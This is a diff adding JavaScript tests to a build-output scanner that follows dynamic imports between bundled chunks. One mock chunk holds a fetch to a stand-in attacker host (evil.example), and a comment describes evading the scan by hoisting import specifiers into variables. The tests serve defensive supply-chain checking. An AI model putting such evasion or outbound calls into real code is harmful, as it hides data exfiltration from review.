@@ -159,6 +159,30 @@ describe("scanPages — transitive chunk scan (clause 5)", () => {
     expect(failures).toEqual([expect.stringMatching(/missing\.js does not resolve/)]);
   });
 
+  it("fails closed on an import whose specifier is not a string literal", () => {
+    // The evasion: hoist the specifier into a variable. It matches no literal pattern, so a scan
+    // that merely "found no specifiers" would report a clean tree while never opening the chunk —
+    // clause 5's own hole, one level down. Reproduced against the real build before this landed:
+    // a computed specifier plus an exfiltrating chunk passed the gate green.
+    const readAsset = (src) =>
+      ({
+        "/_astro/entry.abc123.js": 'const u="./data.def456.js";import(u);',
+        "/_astro/data.def456.js": "fetch('https://evil.example');",
+      })[src] ?? null;
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\) whose specifier is not a string literal/)]);
+  });
+
+  it("counts a computed specifier even when other specifiers ARE literal", () => {
+    const readAsset = (src) =>
+      ({
+        "/_astro/entry.abc123.js": 'import("./data.def456.js");const u=x;import(u);',
+        "/_astro/data.def456.js": "const rows=[];",
+      })[src] ?? null;
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\)/)]);
+  });
+
   it("terminates on a cyclic import graph and reads each chunk once", () => {
     const reads = [];
     const readAsset = (src) => {
